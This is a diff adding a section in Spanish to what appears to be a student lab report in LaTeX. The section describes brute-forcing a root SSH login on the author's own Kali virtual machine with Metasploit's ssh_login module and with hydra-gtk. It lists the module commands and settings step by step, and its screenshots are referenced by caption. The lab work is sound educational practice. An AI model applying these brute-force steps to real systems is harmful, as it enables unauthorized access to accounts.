@@ -369,6 +369,57 @@ La enumeración tiene lugar después de la etapa de \emph{escaneo} (\emph{footpr
 Dentro del directorio \dq{assets} se encuentra el archivo \dq{dnsenum-unpeduar.txt} a modo de evidencia del experimento de enumeración de DNS con \texttt{dnsenum}. 
 
 
+\section{Ataques de fuerza Bruta}
+
+Para realizar los siguientes experimentos, se configurún un servidor SSH en la máquina virtual de Kali, permitiendo ingresar como superusuario.
+
+\subsection{Atacando SSH con \texttt{msfconsole}}
+
+Dentro de la consola de \emph{metasploit}, se ingresaron los siguientes comando para realizar un ataque de fuerza bruta al servidor SSH:
+
+\begin{itemize}
+    \item \texttt{use scanner/ssh/ssh\_login} 
+    \item \texttt{set RHOSTS 127.0.0.1} 
+    \item \texttt{set PASS\_FILE badpasswords} (se incluye el archivo \dq{badpasswords} dentro del directorio \dq{assets}) 
+    \item \texttt{set STOP\_ON\_SUCCESS true} 
+    \item \texttt{set USER root} 
+\end{itemize}
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=\linewidth]{msfconsole_brute_force_ssh}
+    \caption{Ataque de fuerza bruta a un servidor SSH con \texttt{msfconsole}}
+\end{figure}
+
+\subsection{Atacando SSH con \texttt{hydra-gtk}}
+
+Para realizar el mismo experimento pero con la herramienta \texttt{hydra-gtk} (versión con interfaz gráfica de la herramienta \texttt{hydra}), se hicieron los siguientes pasos:
+
+\begin{itemize}
+    \item \emph{Target} 
+    \begin{itemize}
+        \item \texttt{Single Target} $>$ 192.168.0.4 
+        \item \texttt{Port} $>$ 22
+        \item \texttt{Protocol} $>$ SSH
+    \end{itemize}
+    \item \emph{Passwords} 
+    \begin{itemize}
+        \item \texttt{Username} $>$ root
+        \item \texttt{Password List} $>$ badpasswords
+    \end{itemize}
+    \item \emph{Start} 
+    \begin{itemize}
+        \item \texttt{Start}
+    \end{itemize}
+\end{itemize}
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=0.8\linewidth]{hydra_brute_force_ssh}
+    \caption{Ataque de fuerza bruta a un servidor SSH con \texttt{hydra-gtk}}
+\end{figure}
+
+
 
 
 
